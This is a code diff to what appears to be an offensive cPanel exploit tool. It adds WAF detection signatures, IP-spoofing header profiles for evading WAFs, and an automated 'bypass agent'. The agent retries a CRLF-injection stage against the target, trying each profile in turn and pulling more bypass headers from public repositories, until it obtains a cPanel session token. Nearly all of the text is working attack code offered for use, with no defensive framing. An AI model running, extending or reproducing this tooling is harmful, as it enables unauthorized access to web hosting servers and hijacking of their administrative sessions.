@@ -371,7 +371,8 @@ def _do(url, method="GET", extra_headers=None, data=None, timeout=15,
 # ══════════════════════════════════════════════════════════════
 WAF_SIGNATURES: Dict[str, callable] = {
     "Cloudflare":  lambda r: "cf-ray" in r.headers,
-    "Sucuri":      lambda r: "x-sucuri-id" in r.headers or "x-sucuri-cache" in r.headers,
+    "Sucuri":      lambda r: ("x-sucuri-id" in r.headers
+                              or "x-sucuri-cache" in r.headers),
     "Incapsula":   lambda r: ("x-iinfo" in r.headers
                               or "incap_ses" in r.raw_cookies.lower()
                               or "visid_incap" in r.raw_cookies.lower()),
@@ -383,7 +384,26 @@ WAF_SIGNATURES: Dict[str, callable] = {
     "Barracuda":   lambda r: "barra_counter_session" in r.raw_cookies.lower(),
     "F5 BIG-IP":   lambda r: "bigipserver" in r.headers,
     "FortiWeb":    lambda r: "fortiwafsid" in r.raw_cookies.lower(),
-    "Imperva":     lambda r: "x-cdn" in r.headers and "imperva" in r.headers.get("x-cdn","").lower(),
+    "Imperva":     lambda r: ("x-cdn" in r.headers
+                              and "imperva" in r.headers.get("x-cdn","").lower()),
+    # ── Additional WAFs ──────────────────────────────────────────
+    "Azion":       lambda r: ("x-azion-rid" in r.headers
+                              or "azion" in r.headers.get("server", "").lower()
+                              or "azion" in r.headers.get("via", "").lower()),
+    "Wordfence":   lambda r: ("x-fw-hash" in r.headers
+                              or "wordfence_lh" in r.raw_cookies.lower()
+                              or "wordfence" in (r.body or "").lower()),
+    "Reblaze":     lambda r: ("x-reblaze-protection" in r.headers
+                              or "rbzid" in r.raw_cookies.lower()),
+    "Wallarm":     lambda r: "x-wallarm-node-uuid" in r.headers,
+    "Fastly":      lambda r: ("x-fastly-request-id" in r.headers
+                              or ("x-served-by" in r.headers
+                                  and "cache-" in r.headers.get("x-served-by",""))),
+    "Radware":     lambda r: ("x-rdwr-ip" in r.headers
+                              or "rdwr" in r.raw_cookies.lower()),
+    "NAXSI":       lambda r: "x-data-origin" in r.headers and (
+                              r.status == 403 and "naxsi" in (r.body or "").lower()),
+    "DenyAll":     lambda r: "x-denyall" in r.headers,
 }
 
 def detect_waf(scheme: str, host: str, port: int, timeout: int) -> Optional[str]:
@@ -498,6 +518,68 @@ WAF_BYPASS: Dict[str, dict] = {
         },
         "delay": 0.3,
     },
+    # ── Additional WAFs ──────────────────────────────────────────
+    "Azion": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "X-Originating-IP":  "127.0.0.1",
+        },
+        "delay": 0.5,
+    },
+    "Wordfence": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "Reblaze": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+            "X-Remote-IP":       "127.0.0.1",
+            "X-Remote-Addr":     "127.0.0.1",
+        },
+        "delay": 0.5,
+    },
+    "Wallarm": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "Fastly": {
+        "headers": {
+            "X-Forwarded-For":       "127.0.0.1",
+            "Fastly-Client-IP":      "127.0.0.1",
+            "X-Real-IP":             "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "Radware": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "NAXSI": {
+        "headers": {
+            "X-Forwarded-For":            "127.0.0.1",
+            "X-Real-IP":                  "127.0.0.1",
+            "X-Custom-IP-Authorization":  "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
+    "DenyAll": {
+        "headers": {
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.3,
+    },
 }
 
 def get_bypass_headers(waf: Optional[str]) -> dict:
@@ -511,6 +593,385 @@ def get_bypass_delay(waf: Optional[str]) -> float:
     if not waf:
         return 0.0
     return WAF_BYPASS.get(waf, {}).get("delay", 0.0)
+
+# ══════════════════════════════════════════════════════════════
+#  WAF BYPASS AGENT — fallback profiles + internet research
+# ══════════════════════════════════════════════════════════════
+# When the primary bypass profile fails, the agent cycles through these
+# alternative technique profiles, then searches the internet for
+# additional techniques specific to the detected WAF.
+#
+# Each profile: {"name": str, "headers": dict, "delay": float}
+#
+# Techniques cover: IPv6 localhost, RFC-1918 ranges, chained X-Forwarded-For,
+# Forwarded RFC-7239, browser fingerprint headers, Googlebot spoofing.
+
+_GENERIC_FALLBACKS: List[dict] = [
+    {
+        "name": "IPv6 localhost",
+        "headers": {
+            "X-Forwarded-For":  "::1",
+            "X-Real-IP":        "::1",
+            "X-Originating-IP": "::1",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "RFC1918 class-A",
+        "headers": {
+            "X-Forwarded-For":  "10.0.0.1",
+            "X-Real-IP":        "10.0.0.1",
+            "X-Originating-IP": "10.0.0.1",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "RFC1918 class-B",
+        "headers": {
+            "X-Forwarded-For":  "172.16.0.1",
+            "X-Real-IP":        "172.16.0.1",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "RFC1918 class-C",
+        "headers": {
+            "X-Forwarded-For":  "192.168.1.1",
+            "X-Real-IP":        "192.168.1.1",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "Chained X-Forwarded-For",
+        "headers": {
+            "X-Forwarded-For":  "127.0.0.1, 10.0.0.1",
+            "X-Real-IP":        "127.0.0.1",
+            "Forwarded":        "for=127.0.0.1;proto=https",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "Forwarded RFC-7239",
+        "headers": {
+            "Forwarded":         "for=\"[::1]\";proto=https;by=10.0.0.1",
+            "X-Forwarded-For":   "127.0.0.1",
+            "X-Real-IP":         "127.0.0.1",
+        },
+        "delay": 0.5,
+    },
+    {
+        "name": "Full browser fingerprint",
+        "headers": {
+            "X-Forwarded-For":        "127.0.0.1",
+            "X-Real-IP":              "127.0.0.1",
+            "Accept":                 "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language":        "en-US,en;q=0.9,pt-BR;q=0.8",
+            "Accept-Encoding":        "gzip, deflate, br",
+            "Referer":                "https://www.google.com/",
+            "Cache-Control":          "max-age=0",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest":         "document",
+            "Sec-Fetch-Mode":         "navigate",
+            "Sec-Fetch-Site":         "none",
+            "Sec-Fetch-User":         "?1",
+        },
+        "delay": 0.8,
+    },
+    {
+        "name": "Googlebot spoof",
+        "headers": {
+            "X-Forwarded-For": "66.249.66.1",
+            "X-Real-IP":       "66.249.66.1",
+        },
+        "delay": 1.0,
+    },
+    {
+        "name": "All-headers shotgun",
+        "headers": {
+            "X-Forwarded-For":           "127.0.0.1",
+            "X-Real-IP":                 "127.0.0.1",
+            "X-Originating-IP":          "127.0.0.1",
+            "X-Remote-IP":               "127.0.0.1",
+            "X-Remote-Addr":             "127.0.0.1",
+            "X-Client-IP":               "127.0.0.1",
+            "X-Host":                    "127.0.0.1",
+            "X-Forwarded-Host":          "127.0.0.1",
+            "X-ProxyUser-Ip":            "127.0.0.1",
+            "X-Custom-IP-Authorization": "127.0.0.1",
+            "X-True-Client-IP":          "127.0.0.1",
+            "CF-Connecting-IP":          "127.0.0.1",
+            "True-Client-IP":            "127.0.0.1",
+            "Fastly-Client-IP":          "127.0.0.1",
+            "Forwarded":                 "for=127.0.0.1;proto=https",
+        },
+        "delay": 1.0,
+    },
+]
+
+# Per-WAF extra fallbacks appended after the generic list
+_WAF_EXTRA_FALLBACKS: Dict[str, List[dict]] = {
+    "Cloudflare": [
+        {
+            "name": "CF-Connecting-IP IPv6",
+            "headers": {
+                "CF-Connecting-IP": "::1",
+                "X-Forwarded-For":  "::1",
+                "X-Real-IP":        "::1",
+            },
+            "delay": 1.0,
+        },
+        {
+            "name": "CF-Worker spoof",
+            "headers": {
+                "CF-Connecting-IP":   "127.0.0.1",
+                "CF-Worker":          "cPanelpwn",
+                "X-Forwarded-For":    "127.0.0.1",
+                "X-Forwarded-Proto":  "https",
+            },
+            "delay": 1.0,
+        },
+    ],
+    "Akamai": [
+        {
+            "name": "Akamai True-Client-IP IPv6",
+            "headers": {
+                "True-Client-IP":    "::1",
+                "X-True-Client-IP":  "::1",
+                "X-Forwarded-For":   "::1",
+            },
+            "delay": 0.8,
+        },
+    ],
+    "Sucuri": [
+        {
+            "name": "Sucuri whitelist headers",
+            "headers": {
+                "X-Forwarded-For":  "127.0.0.1",
+                "X-Sucuri-Debug":   "0",
+                "X-Real-IP":        "127.0.0.1",
+                "X-Sucuri-Cache":   "MISS",
+            },
+            "delay": 0.5,
+        },
+    ],
+    "AWS WAF": [
+        {
+            "name": "AWS internal header",
+            "headers": {
+                "X-Forwarded-For":     "127.0.0.1",
+                "X-Amzn-Trace-Id":     "Root=1-00000000-000000000000000000000000",
+                "X-Forwarded-Proto":   "https",
+                "X-Forwarded-Port":    "443",
+            },
+            "delay": 0.5,
+        },
+    ],
+    "Azion": [
+        {
+            "name": "Azion edge spoof",
+            "headers": {
+                "X-Forwarded-For":  "127.0.0.1",
+                "X-Real-IP":        "127.0.0.1",
+                "X-Azion-Debug":    "0",
+            },
+            "delay": 0.5,
+        },
+    ],
+    "Fastly": [
+        {
+            "name": "Fastly client-IP spoof",
+            "headers": {
+                "Fastly-Client-IP": "127.0.0.1",
+                "X-Forwarded-For":  "127.0.0.1",
+                "X-Real-IP":        "127.0.0.1",
+                "Fastly-Debug":     "0",
+            },
+            "delay": 0.5,
+        },
+    ],
+}
+
+# Public sources queried for live bypass research
+_BYPASS_RESEARCH_SOURCES: List[tuple] = [
+    # PayloadsAllTheThings WAF bypass section
+    ("https://raw.githubusercontent.com/swisskyrepo/"
+     "PayloadsAllTheThings/master/Web%20Application%20Firewall%20Bypass/README.md"),
+    # Bypass header collection
+    ("https://raw.githubusercontent.com/nicowillis/"
+     "WAF-Bypass/master/bypass_headers.txt"),
+    # Exploit notes
+    ("https://raw.githubusercontent.com/0xInfection/"
+     "Awesome-WAF/master/README.md"),
+]
+
+# Regex patterns to extract HTTP header:value bypass hints from text
+_HDR_EXTRACT_RE = re.compile(
+    r'[`"\']?(X-Forwarded-For|X-Real-IP|X-Originating-IP|X-Remote-(?:IP|Addr)|'
+    r'X-Client-IP|X-ProxyUser-Ip|X-True-Client-IP|True-Client-IP|CF-Connecting-IP|'
+    r'Fastly-Client-IP|X-Custom-IP-Authorization|X-Forwarded-Host|Forwarded|'
+    r'X-Forwarded-Proto)[`"\']?\s*:\s*[`"\']?([0-9a-fA-F:.]+|localhost)',
+    re.IGNORECASE,
+)
+
+def _parse_bypass_headers_from_doc(text: str) -> List[dict]:
+    """
+    Extract IP-spoof bypass headers from arbitrary text (markdown, source code).
+    Groups headers found within 5 lines of each other into one technique profile.
+    """
+    lines    = text.splitlines()
+    buckets: List[dict] = []
+    current  = {}
+    last_hit = -10
+
+    for i, line in enumerate(lines):
+        for m in _HDR_EXTRACT_RE.finditer(line):
+            name, value = m.group(1), m.group(2).strip()
+            if i - last_hit > 5 and current:
+                buckets.append(current)
+                current = {}
+            current[name] = value
+            last_hit = i
+
+    if current:
+        buckets.append(current)
+
+    # Deduplicate and return only non-trivial profiles
+    seen, results = set(), []
+    for b in buckets:
+        key = tuple(sorted(b.items()))
+        if key not in seen and len(b) >= 1:
+            seen.add(key)
+            results.append(b)
+
+    return results
+
+def waf_internet_research(waf: str, timeout: int = 12) -> List[dict]:
+    """
+    Query public internet sources for WAF bypass headers.
+    Returns a list of header dicts extracted from those sources.
+    Runs in a background thread — designed to be non-blocking.
+    """
+    log("DISC", f"[bypass-agent] Researching {C.YELLOW}{waf}{C.RESET} bypass online...")
+    collected: List[dict] = []
+    seen: set = set()
+
+    for url in _BYPASS_RESEARCH_SOURCES:
+        try:
+            resp = _do(url, timeout=timeout)
+            if resp.status == 200 and resp.body:
+                found = _parse_bypass_headers_from_doc(resp.body)
+                for h in found:
+                    k = tuple(sorted(h.items()))
+                    if k not in seen:
+                        seen.add(k)
+                        collected.append(h)
+                if found:
+                    log("OK", f"[bypass-agent]   {url.split('/')[-1]}: "
+                        f"{len(found)} header group(s)")
+        except Exception as e:
+            log("WARN", f"[bypass-agent]   source failed: {e}")
+
+    # Also try GitHub code search (unauthenticated, 60 req/hr)
+    try:
+        q = quote(f"{waf} WAF bypass X-Forwarded-For 127.0.0.1")
+        gh  = f"https://api.github.com/search/code?q={q}&per_page=3"
+        r2  = _do(gh, timeout=timeout,
+                  extra_headers={"Accept": "application/vnd.github.v3+json"})
+        if r2.status == 200 and r2.body:
+            data = json.loads(r2.body)
+            for item in data.get("items", []):
+                snippet = item.get("text_matches", [{}])[0].get("fragment", "")
+                if snippet:
+                    for h in _parse_bypass_headers_from_doc(snippet):
+                        k = tuple(sorted(h.items()))
+                        if k not in seen:
+                            seen.add(k)
+                            collected.append(h)
+    except Exception:
+        pass
+
+    log("OK" if collected else "WARN",
+        f"[bypass-agent] Internet research: {len(collected)} new technique(s) found")
+    return collected
+
+def waf_bypass_agent(waf: str,
+                     scheme: str, host: str, port: int,
+                     canonical: str, session_base: str,
+                     timeout: int) -> Optional[str]:
+    """
+    Full bypass retry loop. Called when stage2 fails with a WAF present.
+
+    Execution order:
+      1. Generic fallback profiles (9 techniques, no network)
+      2. WAF-specific extra profiles (in parallel with internet research)
+      3. Internet-researched profiles (fetched from public sources)
+
+    Returns the /cpsess token on first successful bypass, or None if all
+    techniques are exhausted.
+    """
+    generic    = _GENERIC_FALLBACKS
+    waf_extra  = _WAF_EXTRA_FALLBACKS.get(waf, [])
+    local_all  = generic + waf_extra
+    total_local = len(local_all)
+
+    log("WARN",
+        f"[bypass-agent] Primary bypass failed — trying {total_local} "
+        f"local techniques + live internet research", f"{host}:{port}")
+
+    # Start internet research in background thread
+    researched: list = []
+    research_done    = threading.Event()
+
+    def _research():
+        try:
+            researched.extend(waf_internet_research(waf, timeout=15))
+        except Exception:
+            pass
+        finally:
+            research_done.set()
+
+    threading.Thread(target=_research, daemon=True, name="waf-research").start()
+
+    # Try all local techniques
+    for i, profile in enumerate(local_all, 1):
+        name  = profile.get("name", f"profile-{i}")
+        hdrs  = profile.get("headers", {})
+        delay = profile.get("delay", 0.5)
+
+        log("INFO",
+            f"[bypass-agent] [{i}/{total_local}] {C.CYAN}{name}{C.RESET}")
+        time.sleep(delay)
+
+        token = stage2_inject(scheme, host, port, canonical,
+                              session_base, timeout, waf_hdrs=hdrs)
+        if token:
+            log("OK",
+                f"[bypass-agent] {C.GREEN}Bypass successful!{C.RESET} "
+                f"technique: {name}")
+            return token
+
+    # Wait up to 25 s for internet research to finish
+    research_done.wait(timeout=25)
+
+    if researched:
+        log("INFO",
+            f"[bypass-agent] Trying {len(researched)} internet-researched technique(s)...")
+        for i, hdrs in enumerate(researched, 1):
+            log("INFO",
+                f"[bypass-agent] [net-{i}/{len(researched)}] "
+                f"headers: {list(hdrs.keys())}")
+            time.sleep(0.5)
+            token = stage2_inject(scheme, host, port, canonical,
+                                  session_base, timeout, waf_hdrs=hdrs)
+            if token:
+                log("OK",
+                    f"[bypass-agent] {C.GREEN}Bypass via internet-researched technique!{C.RESET}")
+                return token
+
+    log("WARN",
+        f"[bypass-agent] All {total_local + len(researched)} technique(s) "
+        f"exhausted — WAF held", f"{host}:{port}")
+    return None
 
 # ══════════════════════════════════════════════════════════════
 #  SUBDOMAIN DISCOVERY
@@ -1405,8 +1866,15 @@ def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
         log("STEP", "Stage 2/4 — CRLF injection via Authorization header...")
         token = stage2_inject(
             scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)
+
+        # WAF blocked stage2 → engage bypass agent
+        if not token and waf:
+            token = waf_bypass_agent(waf, scheme, host, port,
+                                     canonical, session_base, timeout)
+
         if not token:
-            log("ERR", "Stage 2 failed — target may be patched", target)
+            log("ERR", "Stage 2 failed — target may be patched or WAF unbypassable",
+                target)
             if progress: progress.tick(False)
             return result
 
